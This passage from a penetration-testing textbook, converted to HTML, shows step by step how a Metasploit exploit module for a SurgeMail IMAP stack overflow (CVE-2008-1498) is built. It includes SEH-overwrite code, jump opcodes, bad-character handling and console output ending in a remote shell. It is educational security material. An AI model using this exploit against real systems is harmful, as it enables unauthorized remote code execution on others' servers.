12pt;text-align: left;">0<span class="s25">sploit = &#39;0002 LIST () &quot;/&#39; + evil + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot;</span></p><p class="s30" style="padding-left: 70pt;text-indent: -8pt;line-height: 80%;text-align: left;">&amp;<span class="s25">sock.put(sploit) handler</span></p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">disconnect</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_561.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 17pt;line-height: 81%;text-align: left;">The <span class="s25">&#39;Space&#39; </span>declaration at <span class="s32">O </span>refers to the space available for shellcode. This declaration is very important in an exploit module because it deter-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">mines which payloads Metasploit will allow you to use when running your exploit. Some payloads require much more space than others, so try not to overstate this value. Payload sizes vary greatly and encoding increases their sizes. To see the size of an unencoded payload, you would use the <span class="s25">info </span>com- mand followed by the name of the payload and look for the <span class="s25">Total size </span>value, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_562.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">info payload/windows/shell_bind_tcp</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 107pt;text-indent: 12pt;text-align: left;">Name: Windows Command Shell, Bind TCP Inline Module: payload/windows/shell_bind_tcp Version: 8642</p><p class="s25" style="padding-top: 3pt;padding-left: 120pt;text-indent: -17pt;text-align: left;">Platform: Windows Arch: x86</p><p class="s25" style="padding-left: 94pt;text-indent: -4pt;text-align: left;">Needs Admin: No Total size: 341</p><p class="s25" style="padding-bottom: 3pt;padding-left: 120pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Rank: Normal</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_563.png"/></span></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: justify;">The return address at <span class="s32">8 </span>in the <span class="s25">&#39;Targets&#39; </span>section is currently occupied by a placeholder value, which we’ll change later in the exploit development process.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;line-height: 73%;text-align: justify;">As with the fuzzer module discussed earlier, this exploit connects and logs into the target at <span class="s32">@</span>, uses a string of <span class="s19">A</span>s at <span class="s32">O </span>as the initial buffer, and appends four <span class="s19">C </span>s at <span class="s32">@ </span>to overwrite the SEH. The entire exploit string is gen- erated at <span class="s32">0 </span>and then sent to the target at <span class="s32">&amp;</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark385">Getting a Return Address</a><a name="bookmark393">&zwnj;</a></p><p style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The next step is to locate a <span class="s19">POP-POP-RETN </span>sequence in <span class="s19">surgemail.exe</span>. To do so, copy the executable to a location on your Back|Track machine, and then use the <span class="s25">-p </span>switch with <span class="s25">msfpescan </span>to locate a suitable candidate, as in the follow- ing example:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_564.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/tmp# <span class="s24">msfpescan -p surgemail.exe</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[surgemail.exe]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">0x0042e947 pop esi; pop ebp; ret 0x0042f88b pop esi; pop ebp; ret 0x00458e68 pop esi; pop ebp; ret 0x00458edb pop esi; pop ebp; ret 0x0046754d pop esi; pop ebp; ret 0x00467578 pop esi; pop ebp; ret 0x0046d204 pop eax; pop ebp; ret</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">0x0078506e pop ebx; pop ebp; ret 0x00785105 pop ecx; pop ebx; ret <span class="s24">0x0078517e </span>pop esi; pop ebx; ret</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_565.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When <span class="s25">msfpescan </span>is run against the target executable, it reads through the machine code looking for assembly instructions that match the target (a <span class="s19">POP-POP-RETN </span>sequence in this case) and displays the memory address where these instructions occur. As you can see in the listing, multiple addresses are found. We’ll use the address at the end of the output, <span class="s19">0x0078517e</span>, to overwrite SEH in the exploit. Having made our selection, we edit the <span class="s25">&#39;Targets&#39; </span>section of the exploit module to include this address and edit the <span class="s25">exploit </span>section to include it as part of the buffer to be sent, as shown next.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_566.png"/></span></p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Platform&#39; =&gt; &#39;win&#39;,</p><p class="s25" style="padding-left: 104pt;text-indent: -17pt;text-align: left;">&#39;Targets&#39; =&gt; [</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><span class="s30">O</span>[ &#39;Windows Universal&#39;, { &#39;Ret&#39; =&gt; <span class="s24">&quot;\x7e\x51\x78&quot; </span>} ], # p/p/r in surgemail.exe</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">],</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;DisclosureDate&#39; =&gt; &#39;March 13 2008&#39;,</p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DefaultTarget&#39; =&gt; 0))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">connected = connect_login lead = &quot;\x41&quot; * 10360</p><p class="s30" style="padding-left: 62pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8<span class="s25">evil = lead + </span><span class="s24">[target.ret].pack(&quot;A3&quot;)</span></p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 9pt;text-align: left;">print_status(&quot;Sending payload&quot;)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sploit = &#39;0002 LIST () &quot;/&#39; + evil + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_567.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: justify;">To perform a three-byte overwrite of the SEH, we set the three bytes to be added to the buffer in the <span class="s25">&#39;Targets&#39; </span>block at <span class="s32">O</span>, in little-endian order, as shown in boldface type in the listing. (Endian-ness is determined by the target CPU’s</p><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;line-height: 84%;text-align: left;">architecture, and Intel-compatible processors use little-endian byte ordering.) At <span class="s32">8 </span>we replace the three <span class="s19">C</span>s in the <span class="s25">evil </span>string with <span class="s25">[target.ret].pack(&quot;A3&quot;)</span>,</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">which will send the return address exactly as it is declared in the <span class="s25">&#39;Targets&#39;</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">block. When modifying many exploits that use a three-byte overwrite, you can declare the target address literally (<span class="s19">0x0078517e </span>in this case) and Metasploit will automatically order the bytes correctly when you use <span class="s25">[target.ret].pack(&#39;V&#39;)</span>. This scenario requires more granular control, because if we were to send the null (00) byte, it would represent the end of a string and could prevent the exploit from functioning properly.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now is a good time to run the exploit to make sure that it works prop- erly. If you jump too far ahead when developing an exploit, you run the risk of making an error somewhere and having to do a lot of backtracking to find out what went wrong. Here’s the exploit:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_568.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">use exploit/windows/imap/surgemail_book </span>msf exploit(surgemail_book) &gt; <span class="s24">set IMAPPASS test </span>IMAPPASS =&gt; test</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(surgemail_book) &gt; <span class="s24">set IMAPUSER test</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">IMAPUSER =&gt; test</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(surgemail_book) &gt; <span class="s24">set RHOST 192.168.1.155</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST =&gt; 192.168.1.155</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">msf exploit(surgemail_book) &gt; </span><span class="s24">set PAYLOAD generic/debug_trap</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PAYLOAD =&gt; generic/debug_trap</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(surgemail_book) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Authenticating as test with password test... [*] Sending payload</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Exploit completed, but no session was created. msf exploit(surgemail_book) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_569.png"/></span></p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">The payload that we use at <span class="s32">O</span>, <span class="s25">generic/debug_trap</span>, won’t actually send a payload. Instead, it sends multiple <span class="s25">\xCC</span>s, or breakpoints, to debug the execu- tion flow of the exploit. This is useful for confirming that your shellcode is</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">inserted at the right places in your exploit.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After running the exploit, open the Immunity Debugger, as shown in Figure 14-5, and at the crash select <span class="s18">View</span><span class="s49">►</span><span class="s18">SEH chain</span>. Set a breakpoint by pressing F2, and then press <span class="s9">SHIFT</span>-F9 to pass the exception to the application and step into the <span class="s19">POP-POP-RETN </span>sequence of instructions.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now, still in the debugger, press F7 to single-step through the instructions until you land in the <span class="s19">41414141 </span>contained in NSEH.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="408" height="307" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_570.gif"/></span></p><p class="s29" style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 14-5: Landing in the <span class="s30">POP-POP-RETN </span>instructions</p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, edit the exploit to include the instructions for the short jump back- ward, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_571.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-top: 1pt;padding-left: 116pt;text-indent: 8pt;line-height: 77%;text-align: left;">connected = connect_login <span class="s30">O</span>lead = &quot;\x41&quot; * <span class="s24">10356 </span><span class="s30">8</span>nseh = <span class="s24">&quot;\xeb\xf9\x90\x90&quot;</span></p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 9pt;text-align: left;">evil = lead + nseh + [target.ret].pack(&quot;A3&quot;)</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print_status(&quot;Sending payload&quot;)</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;text-align: left;">sploit = &#39;0002 LIST () &quot;/&#39; + evil + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot; sock.put(sploit)</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;text-align: left;">handler disconnect</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_572.png"/></span></p><p style="text-indent: 0pt;line-height: 16pt;text-align: right;">When editing your exploit, be sure to adjust the initial buffer length at <span class="s32">O</span></p><p style="text-indent: 0pt;line-height: 10pt;text-align: right;">as you make changes, or your alignment will be off. In this case, NSEH is being</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 82%;text-align: justify;">overwritten with the instructions to make a short five-byte jump backward (<span class="s25">\xeb\xf9\x90\x90</span>) <span class="s32">8</span>, where <span class="s25">eb </span>is the operation code for a short jump. The new lead buffer length is adjusted to 10,356 bytes, because these five new</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">bytes come before the SEH overwrite.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When you run the exploit again and step through the instructions in the debugger, you should land in the <span class="s19">41</span>s (hexadecimal <span class="s19">A</span>s) before the exception handler values. The five <span class="s25">INC ECX </span>instructions should be replaced with the code to jump farther back into the initial buffer.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now we’ll change the exploit to include the “near jump” (<span class="s19">\xe9\xdd\xd7\ xff\xff </span>) sequence of instructions, to jump backward to a location near the beginning of the buffer. Looking at the buffer (Figure 14-6), you can see that the entire string of <span class="s19">A</span>s is completely intact, leaving more than 10,000 bytes available for shellcode. Since the average space required for functional shellcode is less than 500 bytes, this leaves you ample room.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="409" height="307" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_573.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Figure 14-6: Lots of room for shellcode</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Now all you have to do is replace the buffer of <span class="s19">41</span>s with NOPs (<span class="s25">\x90</span>) to give yourself a nice NOP slide to land in, and then you can sit back and let Metasploit take care of the shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_574.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 10pt;text-align: left;">connected = connect_login</p><p class="s25" style="padding-left: 62pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><span class="s30">O</span>lead = &quot;\x90&quot; * (<span class="s24">10351 </span>- payload.encoded.length)</p><p class="s30" style="padding-left: 70pt;text-indent: -8pt;line-height: 80%;text-align: left;">8<span class="s25">near = &quot;\xe9\xdd\xd7\xff\xff&quot; nseh = &quot;\xeb\xf9\x90\x90&quot;</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p class="s30" style="padding-top: 3pt;padding-left: 19pt;text-indent: -8pt;line-height: 80%;text-align: left;">@<span class="s25">evil = lead + payload.encoded + near + nseh + [target.ret].pack(&quot;A3&quot;) print_status(&quot;Sending payload&quot;)</span></p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">sploit = &#39;0002 LIST () &quot;/&#39; + evil + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot; sock.put(sploit)</p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">handler disconnect</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_575.png"/></span></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">As you can see in this listing, the initial string of <span class="s19">A</span>s we used earlier is replaced by NOPs minus the length of the shellcode that Metasploit generates at <span class="s32">O</span>. Notice that the buffer length, initially 10,356 bytes, has been decreased</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">by five bytes to 10,351 to account for the near jump instructions at <span class="s32">8</span>. Finally,</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 13pt;text-align: left;">the malicious string is built using all of the exploit’s components at <span class="s32">@</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Now we can select a real payload and execute the module to see what</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">happens. Surprisingly, the exploit completes but no session is created. The exploit module connects and sends its payload, but no shell is returned to us, as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_576.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(surgemail_book) &gt; <span class="s24">set payload windows/shell_bind_tcp</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; windows/shell_bind_tcp</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(surgemail_book) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Started bind handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Authenticating as test with password test... [*] Sending payload</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Exploit completed, but no session was created. msf exploit(surgemail_book) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_577.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark386">Bad Characters and Remote Code Execution</a><a name="bookmark394">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Well, that certainly wasn’t expected: The exploit completes but no session is created. If you check your debugger, you’ll see that the application didn’t</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">even crash—so what happened? Welcome to the sometimes challenging and nearly always frustrating world of <span class="s19">bad characters</span>. Some characters, when sent as part of an exploit buffer, get mangled while being read by the application. The unfortunate result is that bad characters render your shellcode, and sometimes the entire exploit, unusable.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When writing a Metasploit module, you should always be sure to identify all the bad characters, because the shellcode that Metasploit generates differs each time an exploit is launched, and any rogue bad characters will greatly reduce a module’s reliability. In many cases, if you fail to find all the bad characters, the application will crash without running the shellcode. In the preceding example, SurgeMail didn’t even crash. The exploit appears to succeed, but we don’t get a session.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">There are many ways to identify bad characters, including replacing the dynamically created shellcode with a string of sequential characters (<span class="s25">\x00\ x01\x02</span>…), and checking the debugger to see where the first character gets</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">mangled and marking that character as bad. One of the fastest methods, however, is to find the bad characters in the source code of similar exploits. For example, a search of the IMAP exploits as of this writing finds <span class="s25">\x00\x09\ x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b </span>listed as bad characters, as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_578.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">&#39;Privileged&#39; =&gt; false, &#39;DefaultOptions&#39; =&gt;</p><p class="s25" style="padding-left: 106pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;EXITFUNC&#39; =&gt; &#39;thread&#39;,</p><p class="s25" style="padding-left: 106pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Payload&#39; =&gt;</p><p class="s25" style="padding-left: 106pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Space&#39; =&gt; 10351,</p><p class="s25" style="padding-left: 122pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DisableNops&#39; =&gt; true,</p><p class="s24" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;BadChars&#39; =&gt; &quot;\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b&quot;</p><p class="s25" style="padding-left: 106pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Platform&#39; =&gt; &#39;win&#39;,</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Targets&#39; =&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_579.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">When you declare <span class="s25">&#39;BadChars&#39; </span>in an exploit module, Metasploit will auto- matically exclude them from shellcode and from any automatically generated strings of text or NOPs.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When we run the exploit again, as shown next, after declaring bad char- acters, we finally get a session on the third try. The exploit still isn’t reliable, but it works because Metasploit dynamically changes the shellcode each time the exploit is run. As a result, the characters that are causing the module to fail may not always be present.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_580.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(surgemail_book) &gt; <span class="s24">rexploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Started bind handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Authenticating as test with password test... [*] Sending payload</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Exploit completed, but no session was created. msf exploit(surgemail_book) &gt; <span class="s24">rexploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Started bind handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Authenticating as test with password test... [*] Sending payload</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Exploit completed, but no session was created. msf exploit(surgemail_book) &gt; <span class="s24">rexploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Started bind handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Authenticating as test with password test... [*] Sending payload</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Command shell session 1 opened (192.168.1.101:59501 -&gt; 192.168.1.155:4444)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">c:\surgemail&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="437" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_581.png"/></span></p><p class="s19" style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://en.wikibooks.org/wiki/Metasploit/" class="s31" target="_blank">Determining the remaining bad characters is an exercise left for the reader. An excellent, albeit tedious, way to eliminate all bad characters is to follow the technique described at </a>http://en.wikibooks.org/wiki/Metasploit/ WritingWindowsExploit#Dealing_with_badchars<span class="p">.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The current exploit code, including all of the pieces we’ve added, is shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_582.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39;</p><p class="s25" style="padding-left: 52pt;text-indent: -15pt;line-height: 21pt;text-align: left;">class Metasploit3 &lt; Msf::Exploit::Remote include Msf::Exploit::Remote::Imap def initialize(info = {})</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;line-height: 10pt;text-align: left;">super(update_info(info,</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;text-align: left;">&#39;Name&#39; =&gt; &#39;Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow&#39;, &#39;Description&#39; =&gt; %q{</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;text-align: justify;">This module exploits a stack overflow in the Surgemail IMAP Server version 3.8k4-4 by sending an overly long LIST command. Valid IMAP account credentials are required.</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Author&#39; =&gt; [ &#39;ryujin&#39; ],</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;License&#39; =&gt; MSF_LICENSE,</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Version&#39; =&gt; &#39;$Revision: 1 $&#39;,</p><p class="s25" style="padding-left: 99pt;text-indent: -15pt;text-align: left;">&#39;References&#39; =&gt; [</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;BID&#39;, &#39;28260&#39; ],</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[ &#39;CVE&#39;, &#39;2008-1498&#39; ],</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://www.exploit-db.com/exploits/5259%27" class="s34" target="_blank">[ &#39;URL&#39;, 